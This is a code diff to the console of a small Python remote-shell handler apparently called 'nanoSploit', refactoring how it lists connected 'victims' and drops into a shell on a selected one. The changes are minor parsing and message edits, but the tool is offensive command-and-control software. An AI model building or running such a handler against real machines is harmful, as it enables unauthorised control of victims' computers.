@@ -79,33 +79,31 @@ def select_client(client_id: str, clients: dict[str, Victim]):
     # check if id exist
     if client_id in clients.keys():
         if not clients[client_id].enter_shell():
-            print("Lost client connection !")
+            print(f"Lost client '{client_id}' connection !")
             del clients[client_id]
     else:
         print(f"No active connection with id '{client_id}'")
 
 
 def process_cmd(args: str, clients: dict[str, Victim]):
-    arg1, arg2 = args.split(" ")[:2]
+    args_list = args.split(" ")
 
     # Check for first keyword
-    match arg1:
+    match args_list[0]:
+        case "clients":
+            # Command to list active clients
+            if len(clients):
+                print("Nb.\tClient")
+                for i, client in clients.items():
+                    print(f"{i}.\t{client}")
+            else:
+                print("No active clients")
         case "client":
-            # Check for second keyword
-            match arg2:
-                case "-l":
-                    # Command to list active clients
-                    if len(clients):
-                        print("Nb.\tClient")
-                        for i, client in clients.items():
-                            print(f"{i}.\t{client}")
-                    else:
-                        print("No active clients")
-                case arg2 if arg2.isdigit():
-                    # Command to select a victim
-                    select_client(arg2, clients)
-                case _:
-                    print(f"Unknown command: '{args}'")
+            # Command to select a victim
+            if args_list[1].isdigit():
+                select_client(args_list[1], clients)
+            else:
+                print(f"Unknown command: '{args}'")
         case _:
             print(f"Unknown command: '{args}'")
 
@@ -139,7 +137,7 @@ def main():
     except KeyboardInterrupt:
         pass
     finally:
-        print("Exiting nanoSploit ... ")
+        print("\rExiting nanoSploit ... ")
         # Close every connection
         for i, client in clients.items():
             client.conn.close()
